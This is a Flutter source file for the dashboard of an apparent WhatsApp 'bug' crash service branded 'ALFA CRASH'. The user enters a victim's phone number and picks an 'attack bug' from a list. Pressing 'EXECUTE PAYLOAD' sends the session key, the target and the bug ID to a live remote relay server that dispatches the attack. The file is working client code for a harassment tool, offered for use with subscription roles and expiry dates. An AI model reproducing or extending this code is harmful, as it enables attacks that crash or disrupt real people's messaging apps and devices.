import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;

  String selectedBugId = "";
  bool _isSending = false;
  String? _responseMessage;

  // UBAH: Skema Warna ke Green Cyber
  final Color accentGreen = const Color(0xFF1B5E20);
  final Color lightGreen = const Color(0xFF2ECC71);
  final Color successGreen = const Color(0xFF00C853);
  final Color warningOrange = const Color(0xFFFFAB00);
  final Color dangerRed = const Color(0xFFFF5252);

  late VideoPlayerController _videoController;
  late ChewieController? _chewieController;
  bool _isVideoInitialized = false;

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeInOut),
    );
    _fadeController.forward();

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }
    _initializeVideoPlayer();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4');
    _videoController.initialize().then((_) {
      if (!mounted) return;
      setState(() {
        _videoController.setVolume(0.1);
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true,
          looping: true,
          showControls: false,
          autoInitialize: true,
          aspectRatio: _videoController.value.aspectRatio,
        );
        _isVideoInitialized = true;
      });
    }).catchError((error) {
      if (mounted) setState(() => _isVideoInitialized = false);
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController?.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') && !cleaned.startsWith('62')) {
      if (cleaned.startsWith('0')) return '62${cleaned.substring(1)}';
      return null;
    }
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      setState(() => _responseMessage = "Invalid Number Format");
      return;
    }

    setState(() { _isSending = true; _responseMessage = null; });

    try {
      final res = await http.get(Uri.parse("http://kingkyaz.veyoradev.biz.id:4002/sendBug?key=$key&target=$target&bug=$selectedBugId"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) { setState(() => _responseMessage = "System Cooldown Active"); }
      else if (data["valid"] == false) { setState(() => _responseMessage = "Session Invalid/Expired"); }
      else if (data["sended"] == false) { setState(() => _responseMessage = "Relay Server Error"); }
      else {
        setState(() => _responseMessage = "Attack Vector Dispatched");
        targetController.clear();
      }
    } catch (_) {
      setState(() => _responseMessage = "Protocol Sync Failed");
    } finally {
      setState(() => _isSending = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent, // Tetap transparan untuk Dashboard background
      body: FadeTransition(
        opacity: _fadeAnimation,
        child: Column(
          children: [
            _buildCompactHeader(),
            Expanded(
              child: SingleChildScrollView(
                physics: const BouncingScrollPhysics(),
                padding: const EdgeInsets.all(20),
                child: Column(
                  children: [
                    _buildCompactVideo(),
                    const SizedBox(height: 20),
                    _buildCompactControls(),
                    const SizedBox(height: 20),
                    if (_responseMessage != null) _buildCompactResponse(),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCompactHeader() {
    return ClipRRect(
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.4),
            border: Border(bottom: BorderSide(color: Colors.white.withOpacity(0.05))),
          ),
          child: Row(
            children: [
              Container(
                width: 40, height: 40,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(color: lightGreen.withOpacity(0.3), width: 1.5),
                ),
                child: ClipOval(child: Image.asset('assets/images/logo.jpg', fit: BoxFit.cover)),
              ),
              const SizedBox(width: 15),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(widget.username, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 0.5)),
                    Text("${widget.role.toUpperCase()} • ${widget.expiredDate}",
                        style: TextStyle(color: lightGreen.withOpacity(0.7), fontSize: 10, fontWeight: FontWeight.w500)),
                  ],
                ),
              ),
              // Indicator Online
              Container(
                  width: 8, height: 8,
                  decoration: BoxDecoration(
                      color: successGreen,
                      shape: BoxShape.circle,
                      boxShadow: [BoxShadow(color: successGreen, blurRadius: 4)]
                  )
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildCompactVideo() {
    return Container(
      height: 200,
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: lightGreen.withOpacity(0.1)),
        boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 20)],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(19),
        child: Stack(
          children: [
            if (_isVideoInitialized && _chewieController != null)
              Positioned.fill(child: Chewie(controller: _chewieController!))
            else
              Center(child: CircularProgressIndicator(color: lightGreen, strokeWidth: 2)),

            // Overlay Gradient
            Positioned.fill(
              child: Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.transparent, Colors.black.withOpacity(0.8)],
                  ),
                ),
              ),
            ),
            const Positioned(
              bottom: 15, left: 15,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text("NODE TERMINAL", style: TextStyle(color: Colors.white38, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 2)),
                  Text("𝐀𝐋𝐅𝐀 𝐂𝐑𝐀𝐒𝐇", style: TextStyle(color: Colors.white, fontSize: 22, fontWeight: FontWeight.bold)),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCompactControls() {
    return ClipRRect(
      borderRadius: BorderRadius.circular(24),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.03),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: Colors.white.withOpacity(0.08)),
          ),
          child: Column(
            children: [
              TextField(
                controller: targetController,
                keyboardType: TextInputType.phone,
                style: const TextStyle(color: Colors.white, fontFamily: 'monospace'),
                decoration: _inputDecoration("Target (e.g. 628xxx)", Icons.radar_rounded),
              ),
              const SizedBox(height: 16),
              DropdownButtonFormField<String>(
                value: selectedBugId,
                dropdownColor: const Color(0xFF0A0A0A),
                icon: Icon(Icons.keyboard_arrow_down_rounded, color: lightGreen),
                decoration: _inputDecoration("Select Attack Bug", FontAwesomeIcons.whatsapp),
                style: const TextStyle(color: Colors.white, fontSize: 14),
                items: widget.listBug.map((bug) {
                  return DropdownMenuItem<String>(
                    value: bug['bug_id'],
                    child: Text(bug['bug_name']),
                  );
                }).toList(),
                onChanged: (value) => setState(() => selectedBugId = value!),
              ),
              const SizedBox(height: 25),
              SizedBox(
                width: double.infinity,
                height: 55,
                child: ElevatedButton(
                  onPressed: _isSending ? null : _sendBug,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: lightGreen,
                    foregroundColor: Colors.black,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
                    elevation: 0,
                  ),
                  child: _isSending
                      ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2))
                      : const Text("EXECUTE PAYLOAD", style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1.5)),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  InputDecoration _inputDecoration(String hint, IconData icon) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 13),
      prefixIcon: Icon(icon, color: lightGreen, size: 20),
      filled: true,
      fillColor: Colors.white.withOpacity(0.03),
      border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
      enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.white.withOpacity(0.05))),
      focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: lightGreen.withOpacity(0.5))),
      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
    );
  }

  Widget _buildCompactResponse() {
    bool isSuccess = _responseMessage!.toLowerCase().contains('success') || _responseMessage!.toLowerCase().contains('dispatched');
    Color statusColor = isSuccess ? successGreen : (_responseMessage!.toLowerCase().contains('sync') || _responseMessage!.toLowerCase().contains('cooldown') ? warningOrange : dangerRed);

    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: statusColor.withOpacity(0.1),
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: statusColor.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Icon(isSuccess ? Icons.terminal_rounded : Icons.warning_amber_rounded, color: statusColor, size: 18),
          const SizedBox(width: 15),
          Expanded(
              child: Text(
                  _responseMessage!.toUpperCase(),
                  style: TextStyle(color: statusColor, fontWeight: FontWeight.bold, fontSize: 11, letterSpacing: 1)
              )
          ),
        ],
      ),
    );
  }
}